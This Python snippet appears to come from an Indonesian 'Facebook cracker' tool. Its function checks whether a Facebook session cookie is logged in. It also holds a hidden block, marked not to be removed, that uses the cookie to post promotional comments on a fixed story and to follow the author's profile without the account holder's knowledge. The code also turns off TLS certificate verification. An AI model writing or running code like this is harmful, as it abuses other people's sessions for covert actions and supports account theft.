import re, requests,random
from bs4 import BeautifulSoup as parser
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
def val(host,kuki):
    try:
        kuki = {"cookie":kuki}
        ismi = requests.get(host.format("/me"),verify=False,cookies=kuki).content
        if "mbasic_logout_button" in str(ismi):
            if "Apa yang Anda pikirkan sekarang" in str(ismi):
                pass
            else:
                try:
                    requests.get(host.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=kuki)
                except:
                    pass
            try:
                # please don't remove this or change
                # you can added this block
                # Comment to author
                x = {}
                to = parser(requests.get(host.format("/story.php?story_fbid=247453390024673&substory_index=2&id=100042800416881"),cookies=kuki).content,"html.parser")
                joe = re.findall('"><form action="(/a/comment.php\?fs=.*?)".*?name="fb_dtsg".*?value="(.*?)".*?name="jazoest".*?value="(\d*)"',str(to))[0]
                x["fb_dtsg"] = joe[1]
                x["jazoest"] = joe[2]
                kata = ["Hy, I'm Facebook cracker user","Toolsnya mantap","Buset bro, sumpah ini keren!!"]
                x["comment_text"] = random.choice(kata)
                requests.post(host.format(joe[0].replace("&amp;","&")),data=x,cookies=kuki)
                ikuti = parser(requests.get(host.format("/zettid.1"),cookies=kuki).content,"html.parser").find("a",string="Ikuti")["href"]
                requests.get(host.format(ikuti),cookies=kuki)
            except TypeError:
                pass
            return True
        else:
            return False
    except requests.exceptions.ConnectionError:
        exit("# Bad connection")
